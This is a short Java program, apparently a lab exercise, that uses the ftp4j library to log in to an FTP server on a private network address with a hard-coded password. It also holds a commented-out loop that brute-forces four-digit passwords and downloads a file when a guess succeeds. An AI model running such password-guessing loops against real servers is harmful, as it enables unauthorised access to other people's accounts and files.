import java.io.File;
import java.io.IOException;

import it.sauronsoftware.ftp4j.FTPAbortedException;
import it.sauronsoftware.ftp4j.FTPClient;
import it.sauronsoftware.ftp4j.FTPDataTransferException;
import it.sauronsoftware.ftp4j.FTPException;
import it.sauronsoftware.ftp4j.FTPFile;
import it.sauronsoftware.ftp4j.FTPIllegalReplyException;
import it.sauronsoftware.ftp4j.FTPListParseException;

public class Main {
	public static void main(String[] args) throws IllegalStateException, IOException, FTPIllegalReplyException, FTPException, FTPDataTransferException, FTPAbortedException, FTPListParseException {
		
		FTPClient client = new FTPClient();
		client.connect("192.168.150.11",21); // connect
		client.login("java", "0111"); // "id","password"
		
//		FTPFile[] list = client.list();
		
		//download
//		client.download("test.txt", new File("C:\\Users\\dnfqh\\Desktop\\download\\text.txt"));
//		client.disconnect(true);
		
//		//Brute Force
//		for (int i = 0; i < 10000; i++) {
//			try {
//				client.login("java", String.valueOf(i)); 
//				//download
//				client.download("test.txt", new File("C:\\Users\\dnfqh\\Desktop\\download\\text.txt"));
//				break;
//			} catch (Exception e) {
//				System.out.println("Wrong Password!"+i);
//			}
//			
			
//		}
		
		
		
		
		
		
	}
}
